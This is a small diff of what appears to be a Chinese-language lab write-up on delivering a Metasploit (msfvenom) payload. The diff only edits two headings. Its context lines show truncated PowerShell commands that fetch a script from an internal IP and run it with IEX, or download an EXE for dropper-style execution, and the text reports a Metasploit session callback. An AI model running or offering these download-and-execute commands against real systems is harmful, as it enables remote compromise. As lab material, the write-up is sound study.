@@ -80,7 +80,7 @@ powershell.exe -nop -c "IEX((New-Object Net.WebClient).DownloadString('[http://1
 
 ## 4\. Solution 
 
-### 4.1 Correct Approach (修正代码)
+### 4.1 Correct Approach 
 
 对于 EXE 载荷，必须采用“落地执行”策略（Dropper）。
 
@@ -91,7 +91,7 @@ powershell -nop -c "(New-Object Net.WebClient).DownloadFile('[http://192.168.75.
 ```
 ![Image: MSFVenom Generation](5.png)
 
-### 4.2 Verification (验证)
+### 4.2 Verification 
 
 修正命令后，Metasploit 成功接收到 Session 回连。
 ![Image: MSFVenom Generation](6.png)
